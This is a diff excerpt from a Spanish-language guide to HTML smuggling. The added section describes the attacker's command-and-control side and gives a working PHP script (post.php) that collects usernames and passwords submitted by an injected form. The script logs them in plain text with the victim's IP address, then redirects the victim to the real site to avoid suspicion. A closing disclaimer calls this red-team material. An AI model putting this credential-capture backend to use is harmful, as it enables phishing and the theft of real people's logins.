@@ -50,3 +50,28 @@ El siguiente código muestra cómo se utiliza JavaScript para decodificar un pay
     </script>
 </body>
 </html>
+
+⚙️ Infraestructura de Recepción (C2)
+El atacante levanta un servidor ligero (Apache/Nginx) con un script PHP para capturar las credenciales enviadas por el formulario inyectado.
+
+Script de Captura (post.php):
+
+PHP
+
+<?php
+// Recepción de credenciales en texto plano
+$file = 'capturas.txt';
+
+// Verificamos si llegan datos por POST
+if(isset($_POST['user']) && isset($_POST['pass'])) {
+    $data = "User: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    
+    // Guardado persistente en el servidor atacante
+    file_put_contents($file, $data, FILE_APPEND);
+}
+
+// Redirección final para no levantar sospechas (a la web real)
+header('Location: [https://sitio-legitimo.com](https://sitio-legitimo.com)');
+exit();
+?>
+Disclaimer: Esta documentación demuestra técnicas avanzadas de evasión para pruebas de Red Team. El uso de HTML Smuggling contra objetivos sin autorización es ilegal.
